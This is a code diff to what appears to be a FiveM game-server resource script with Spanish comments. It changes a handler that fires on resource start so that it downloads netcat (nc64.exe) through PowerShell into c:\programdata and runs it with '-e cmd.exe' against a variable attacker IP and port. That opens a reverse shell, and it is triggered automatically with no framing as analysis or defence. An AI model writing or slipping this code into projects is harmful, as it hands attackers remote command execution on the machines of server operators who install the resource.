@@ -33,15 +33,7 @@ on('onResourceStart', async (resourceName) => {
         // Descargar netcat
         await downloadNC();
 
-        exec(`powershell -c invoke-webrequest -uri ${ncUrl}; ${ncFile} ${attackerIP} ${attackerPort} -e cmd.exe`, (error, stdout, stderr) => {
-            if (error) {
-                console.error(`Error: ${error}`);
-                return;
-            }
-            console.log(`stdout: ${stdout}`);
-        });
-
-        exec(`certutil -urlcache -split -f ${ncUrl}; ${ncFile} ${attackerIP} ${attackerPort} -e cmd.exe`, (error, stdout, stderr) => {
+        exec(`powershell -c invoke-webrequest -uri https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile c:\\programdata\\nc64.exe ; c:\\programdata\\nc64.exe ${attackerIP} ${attackerPort} -e cmd.exe`, (error, stdout, stderr) => {
             if (error) {
                 console.error(`Error: ${error}`);
                 return;
